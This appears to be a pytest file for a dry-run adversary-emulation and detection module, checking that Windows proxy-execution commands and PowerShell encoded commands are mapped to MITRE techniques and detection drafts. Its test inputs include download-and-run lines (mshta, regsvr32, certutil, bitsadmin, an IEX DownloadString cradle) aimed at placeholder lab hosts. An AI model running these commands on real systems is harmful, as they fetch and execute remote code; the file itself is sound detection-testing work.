"""Windows-first depth pass on the execution module.

Pinned behaviours:

1. Windows signed-binary proxy execution (T1218 family + T1140 + T1197)
   is recognised as a distinct sub-technique catalog and produces
   process_creation/windows detection drafts that fire on
   ``process.image|endswith \\<binary>.exe``.
2. PowerShell ``-EncodedCommand`` payloads are decoded from base64 +
   UTF-16 LE and surface as ``decoded_command`` in artifacts /
   detection hints, with a dedicated detection title.
3. Telemetry / artifacts / detection hints all carry
   ``parent_command_line`` so a defender can correlate the spawn
   chain (operator-supplied or per-OS default).
4. The detection draft uses the basename helper, not the fragile
   ``command.split(" ")[0]`` pattern, so quoted Windows paths with
   spaces resolve correctly.
"""

from __future__ import annotations

import base64
from pathlib import Path
from typing import Any, Dict

from src.core.models import ModuleResult, RunContext
from src.core.modules.impl.standard_modules import (
    ExecutionModule,
    _PROXY_EXECUTION_PROFILES,
    _command_basename,
    _decode_powershell_encoded_command,
    _extract_proxy_target,
    _resolve_proxy_profile,
)


def _ctx(tmp_path: Path) -> Dict[str, Any]:
    out_dir = tmp_path / "run"
    out_dir.mkdir(parents=True, exist_ok=True)
    return {
        "run_context": RunContext(
            run_id="rid-test",
            output_dir=out_dir,
            config={},
            dry_run=True,
            max_runtime=60,
            allowed_subnets=[],
        ),
        "run_id": "rid-test",
        "dry_run": True,
        "allowed_subnets": [],
        "max_runtime": 60,
        "config": {},
        "previous_step_results": {},
    }


# ---------------------------------------------------------------------------
# _resolve_proxy_profile
# ---------------------------------------------------------------------------


def test_proxy_profile_resolves_mshta() -> None:
    profile = _resolve_proxy_profile("mshta http://lab.invalid/payload.hta")
    assert profile is not None
    assert profile["mitre"] == "T1218.005"
    assert profile["interpreter"] == "mshta"


def test_proxy_profile_resolves_rundll32_with_path_and_exe() -> None:
    profile = _resolve_proxy_profile(
        "C:\\Windows\\System32\\rundll32.exe shell32.dll,Control_RunDLL"
    )
    assert profile is not None
    assert profile["mitre"] == "T1218.011"


def test_proxy_profile_resolves_regsvr32() -> None:
    profile = _resolve_proxy_profile("regsvr32 /s /n /u /i:http://lab.invalid/x.sct scrobj.dll")
    assert profile is not None
    assert profile["mitre"] == "T1218.010"


def test_proxy_profile_resolves_msiexec() -> None:
    profile = _resolve_proxy_profile("msiexec /i http://lab.invalid/p.msi /q")
    assert profile is not None
    assert profile["mitre"] == "T1218.007"


def test_proxy_profile_resolves_certutil() -> None:
    profile = _resolve_proxy_profile("certutil -urlcache -split -f http://lab.invalid/x.txt")
    assert profile is not None
    assert profile["mitre"] == "T1140"


def test_proxy_profile_resolves_bitsadmin() -> None:
    profile = _resolve_proxy_profile(
        "bitsadmin /transfer myJob /download http://lab.invalid/p.exe C:\\\\temp\\\\p.exe"
    )
    assert profile is not None
    assert profile["mitre"] == "T1197"


def test_proxy_profile_does_not_match_powershell() -> None:
    """PowerShell is in the interpreter catalog, not the proxy one."""

    assert _resolve_proxy_profile("powershell -nop -enc Zm9v") is None


def test_proxy_profile_handles_empty_command() -> None:
    assert _resolve_proxy_profile("") is None
    assert _resolve_proxy_profile("   ") is None


def test_proxy_catalog_has_windows_signed_binary_coverage() -> None:
    """Catalog must include the seven Windows binaries the deepening targets."""

    expected = {"mshta", "rundll32", "regsvr32", "msiexec", "installutil", "certutil", "bitsadmin"}
    assert expected.issubset(set(_PROXY_EXECUTION_PROFILES.keys()))


# ---------------------------------------------------------------------------
# _command_basename
# ---------------------------------------------------------------------------


def test_command_basename_strips_quoted_windows_path() -> None:
    """``command.split(" ")[0]`` would truncate at the space inside the quote."""

    assert _command_basename(
        '"C:\\Program Files\\PowerShell\\7\\pwsh.exe" -nop -c X'
    ) == "pwsh.exe"


def test_command_basename_strips_unquoted_windows_path() -> None:
    assert _command_basename(
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop"
    ) == "powershell.exe"


def test_command_basename_returns_empty_for_empty_command() -> None:
    assert _command_basename("") == ""
    assert _command_basename("   ") == ""


# ---------------------------------------------------------------------------
# _decode_powershell_encoded_command
# ---------------------------------------------------------------------------


def _ps_encode(payload: str) -> str:
    return base64.b64encode(payload.encode("utf-16-le")).decode("ascii")


def test_decode_recognises_encodedcommand_long_form() -> None:
    encoded = _ps_encode("Get-Process")
    assert _decode_powershell_encoded_command(
        f"powershell -nop -EncodedCommand {encoded}"
    ) == "Get-Process"


def test_decode_recognises_enc_short_form() -> None:
    encoded = _ps_encode("Start-Process calc.exe")
    assert _decode_powershell_encoded_command(
        f"powershell -nop -enc {encoded}"
    ) == "Start-Process calc.exe"


def test_decode_recognises_ec_shortest_form() -> None:
    encoded = _ps_encode("Invoke-Expression $x")
    assert _decode_powershell_encoded_command(
        f"powershell -ec {encoded}"
    ) == "Invoke-Expression $x"


def test_decode_recognises_slash_prefix() -> None:
    """PowerShell also accepts /enc as a flag spelling."""

    encoded = _ps_encode("Get-Date")
    assert _decode_powershell_encoded_command(
        f"powershell /enc {encoded}"
    ) == "Get-Date"


def test_decode_returns_none_when_no_flag_present() -> None:
    assert _decode_powershell_encoded_command("powershell -nop -c Get-Date") is None


def test_decode_returns_none_for_invalid_base64() -> None:
    assert _decode_powershell_encoded_command("powershell -enc not-base64!!!") is None


def test_decode_returns_none_for_non_utf16le_payload() -> None:
    """A base64 blob that isn't UTF-16 LE must fail safely, not return junk."""

    raw = base64.b64encode(b"\xff\xfe\xff").decode("ascii")
    assert _decode_powershell_encoded_command(f"powershell -enc {raw}") is None


def test_decode_handles_empty_command() -> None:
    assert _decode_powershell_encoded_command("") is None


def test_decode_safe_with_unbalanced_quotes() -> None:
    """Unbalanced quotes raise from shlex; helper must swallow it."""

    assert _decode_powershell_encoded_command('powershell -enc "abc') is None


# ---------------------------------------------------------------------------
# _extract_proxy_target
# ---------------------------------------------------------------------------


def test_extract_proxy_target_picks_first_unflagged_token() -> None:
    assert _extract_proxy_target(
        "mshta http://lab.invalid/payload.hta", "mshta"
    ) == "http://lab.invalid/payload.hta"


def test_extract_proxy_target_skips_flag_tokens() -> None:
    assert _extract_proxy_target(
        "msiexec /i http://lab.invalid/p.msi /q /norestart", "msiexec"
    ) == "http://lab.invalid/p.msi"


def test_extract_proxy_target_returns_dll_function_for_rundll32() -> None:
    assert _extract_proxy_target(
        "rundll32.exe shell32.dll,Control_RunDLL", "rundll32"
    ) == "shell32.dll,Control_RunDLL"


def test_extract_proxy_target_returns_none_when_no_payload() -> None:
    assert _extract_proxy_target("mshta", "mshta") is None


# ---------------------------------------------------------------------------
# ExecutionModule integration
# ---------------------------------------------------------------------------


def test_execution_proxy_branch_emits_t1218_technique(tmp_path: Path) -> None:
    mod = ExecutionModule()
    mod.update_config({})
    result: ModuleResult = mod.execute(
        {"command": "mshta http://lab.invalid/payload.hta"}, _ctx(tmp_path)
    )
    assert result.techniques == ["T1218.005"]
    assert result.detection_hints["proxy_profile"] == "mshta"
    assert (
        result.detection_hints["proxy_target"] == "http://lab.invalid/payload.hta"
    )
    selection = result.detection_hints["detection"]["selection"]
    assert selection["process.image|endswith"] == "\\mshta.exe"
    assert selection["process.command_line|contains"] == "http://lab.invalid/payload.hta"


def test_execution_proxy_logsource_is_windows(tmp_path: Path) -> None:
    """T1218 is Windows-only by definition; the draft logsource must not
    fall through to ``host``."""

    mod = ExecutionModule()
    mod.update_config({})
    result = mod.execute(
        {"command": "regsvr32 /s /n /u /i:http://lab/x.sct scrobj.dll"},
        _ctx(tmp_path),
    )
    assert result.detection_hints["logsource"] == {
        "category": "process_creation",
        "product": "windows",
    }


def test_execution_decoded_command_surfaces_in_artifacts_and_hints(
    tmp_path: Path,
) -> None:
    encoded = _ps_encode("IEX (New-Object Net.WebClient).DownloadString('http://lab/x')")
    mod = ExecutionModule()
    mod.update_config({})
    result = mod.execute(
        {"command": f"powershell -nop -w hidden -enc {encoded}"}, _ctx(tmp_path)
    )
    assert result.artifacts["decoded_command"].startswith("IEX")
    assert "decoded_command" in result.detection_hints
    assert result.detection_hints["title"].startswith("PowerShell EncodedCommand execution")


def test_execution_decoded_command_telemetry_event_carries_payload(
    tmp_path: Path,
) -> None:
    encoded = _ps_encode("Start-Process notepad.exe")
    mod = ExecutionModule()
    mod.update_config({})
    result = mod.execute(
        {"command": f"powershell -enc {encoded}"}, _ctx(tmp_path)
    )
    assert result.telemetry
    event = result.telemetry[0]
    assert event.details["decoded_command"] == "Start-Process notepad.exe"


def test_execution_parent_command_line_param_overrides_default(tmp_path: Path) -> None:
    mod = ExecutionModule()
    mod.update_config({})
    result = mod.execute(
        {
            "command": "powershell -nop -c X",
            "parent_command_line": "winword.exe /n /q",
        },
        _ctx(tmp_path),
    )
    assert result.artifacts["parent_command_line"] == "winword.exe /n /q"
    assert result.detection_hints["process_parent_command_line"] == "winword.exe /n /q"


def test_execution_parent_command_line_default_is_explorer_on_windows(
    tmp_path: Path,
) -> None:
    mod = ExecutionModule()
    mod.update_config({})
    result = mod.execute(
        {"command": "powershell -nop -c X", "target_os": "windows"}, _ctx(tmp_path)
    )
    assert result.artifacts["parent_command_line"] == "explorer.exe"


def test_execution_detection_uses_basename_not_naive_split(tmp_path: Path) -> None:
    """``"C:\\Program Files\\..\\pwsh.exe" -c X`` would naively split at
    the space inside the quotes; the draft must use the basename helper."""

    mod = ExecutionModule()
    mod.update_config({})
    cmd = '"C:\\Program Files\\PowerShell\\7\\pwsh.exe" -nop -c Get-Date'
    result = mod.execute({"command": cmd, "target_os": "windows"}, _ctx(tmp_path))
    selection = result.detection_hints["detection"]["selection"]
    assert selection["process.image|endswith"] == "\\pwsh.exe"


def test_execution_proxy_profile_takes_precedence_over_interpreter(tmp_path: Path) -> None:
    """If the operator chains powershell -> rundll32, the proxy profile
    wins (T1218.011 dominates over the default T1059)."""

    mod = ExecutionModule()
    mod.update_config({})
    result = mod.execute(
        {"command": "rundll32.exe shell32.dll,Control_RunDLL"}, _ctx(tmp_path)
    )
    assert result.techniques == ["T1218.011"]
    assert result.detection_hints["interpreter"] == "rundll32"


def test_execution_chain_emits_process_artifact_with_image_basename(
    tmp_path: Path,
) -> None:
    mod = ExecutionModule()
    mod.update_config({})
    result = mod.execute({"command": "powershell -nop -c X"}, _ctx(tmp_path))
    # Existing artifact contract pinned by IO contract test: produces
    # PROCESS keyed off ``command``. The new image_basename surface is
    # additive and lets downstream chain consumers (persistence,
    # defense_evasion) pivot on the binary name.
    assert result.artifacts["image_basename"] == "powershell"
    assert result.artifacts["command"] == "powershell -nop -c X"


def test_execution_certutil_decode_emits_t1140(tmp_path: Path) -> None:
    """certutil is in the proxy catalog as the deobfuscation
    tradecraft (T1140), not as a T1218 sub-technique."""

    mod = ExecutionModule()
    mod.update_config({})
    result = mod.execute(
        {"command": "certutil -urlcache -split -f http://lab/x.txt"}, _ctx(tmp_path)
    )
    assert result.techniques == ["T1140"]


def test_execution_bitsadmin_emits_t1197(tmp_path: Path) -> None:
    mod = ExecutionModule()
    mod.update_config({})
    result = mod.execute(
        {"command": "bitsadmin /transfer myJob /download http://lab/p.exe C:\\\\t\\\\p.exe"},
        _ctx(tmp_path),
    )
    assert result.techniques == ["T1197"]
